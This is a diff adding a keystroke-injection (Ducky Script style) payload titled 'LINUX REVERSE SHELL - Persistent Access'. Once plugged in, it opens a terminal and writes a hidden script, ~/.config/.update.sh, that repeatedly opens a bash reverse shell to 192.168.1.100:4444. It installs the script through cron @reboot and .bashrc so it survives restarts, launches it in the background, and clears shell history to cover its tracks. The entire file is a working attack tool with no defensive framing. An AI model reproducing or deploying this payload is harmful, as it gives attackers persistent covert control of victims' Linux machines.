@@ -1,0 +1,52 @@
+# ============================================
+# LINUX REVERSE SHELL - Persistent Access
+# ============================================
+# Purpose: Establish reverse shell connection
+# Target: Linux systems
+# Time: 10 seconds
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+DELAY 2000
+
+CTRL ALT T
+DELAY 1000
+
+# Create reverse shell script
+STRING cat > ~/.config/.update.sh << 'SHELL'
+ENTER
+STRING #!/bin/bash
+ENTER
+STRING while true; do
+ENTER
+STRING   bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+ENTER
+STRING   sleep 300
+ENTER
+STRING done
+ENTER
+STRING SHELL
+ENTER
+DELAY 200
+
+STRING chmod +x ~/.config/.update.sh
+ENTER
+DELAY 100
+
+# Add to cron
+STRING (crontab -l 2>/dev/null; echo "@reboot ~/.config/.update.sh") | crontab -
+ENTER
+DELAY 200
+
+# Add to bashrc
+STRING echo "~/.config/.update.sh &" >> ~/.bashrc
+ENTER
+DELAY 100
+
+# Start immediately
+STRING nohup ~/.config/.update.sh >/dev/null 2>&1 &
+ENTER
+DELAY 200
+
+STRING history -c; clear; exit
+ENTER
